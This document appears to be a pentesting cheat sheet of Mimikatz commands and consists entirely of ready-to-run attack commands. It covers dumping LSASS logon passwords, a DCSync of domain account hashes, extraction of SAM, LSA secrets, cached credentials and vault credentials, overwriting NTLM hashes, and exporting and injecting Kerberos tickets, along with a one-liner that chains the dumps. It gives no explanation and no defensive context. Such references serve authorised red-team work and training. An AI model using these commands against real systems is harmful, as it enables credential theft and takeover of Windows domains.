# Mimikatz

#### General

```
privilege::debug
log
log customlogfilename.log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

#### DCSync

```
mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit
```

#### Credentials

<pre class="language-powershell"><code class="lang-powershell"><strong>sekurlsa::logonpasswords
</strong>sekurlsa::logonPasswords full
sekurlsa::minidump lsass.dmp

# lsadump
lsadump::lsa /inject
lsadump::sam
lsadump::secrets
lsadump::cache

# Set NTLM hash
lsadump::setntlm /user:targetUser /ntlm:newNtlmHash

# Vault
token::elevate
vault::cred
vault::cred /patch
vault::list

# oneliner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
</code></pre>

#### Kerberos

```
kerberos::list /export
kerberos::ptt c:\ticket.kirbi
```



